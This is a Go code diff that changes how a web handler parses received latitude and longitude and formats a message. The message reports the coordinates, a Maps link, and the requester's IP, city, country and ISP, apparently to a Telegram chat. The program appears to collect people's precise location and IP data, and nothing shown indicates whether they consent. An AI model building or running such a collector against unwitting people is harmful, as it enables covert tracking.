@@ -19,10 +19,9 @@ type IPInfo struct {
 	ISP     string `json:"isp"`
 }
 
-// Para aceitar float ou string no JSON
 type LocationRequest struct {
-	Latitude  json.Number `json:"latitude"`
-	Longitude json.Number `json:"longitude"`
+	Latitude  float64 `json:"latitude"`
+	Longitude float64 `json:"longitude"`
 }
 
 type TelegramMessage struct {
@@ -144,17 +143,12 @@ func sendLocationHandler(w http.ResponseWriter, r *http.Request) {
 		ipInfo = &IPInfo{}
 	}
 
-	lat := loc.Latitude.String()
-	lon := loc.Longitude.String()
-	mapsLink := "Coordinates not available"
-	if lat != "" && lon != "" {
-		mapsLink = fmt.Sprintf("[View on Google Maps](https://www.google.com/maps?q=%s,%s)", lat, lon)
-	}
+	mapsLink := fmt.Sprintf("[View on Google Maps](https://www.google.com/maps?q=%f,%f)", loc.Latitude, loc.Longitude)
 
 	message := fmt.Sprintf(`
 📍 *Location Received:*
-Latitude: %s
-Longitude: %s
+Latitude: %f
+Longitude: %f
 
 🌐 *IP:* %s
 🏙 *City:* %s
@@ -163,8 +157,8 @@ Longitude: %s
 
 🔗 %s
 `,
-		emptyIf(lat, "Not provided"),
-		emptyIf(lon, "Not provided"),
+		loc.Latitude,
+		loc.Longitude,
 		ip,
 		emptyIf(ipInfo.City, "N/A"),
 		emptyIf(ipInfo.Country, "N/A"),
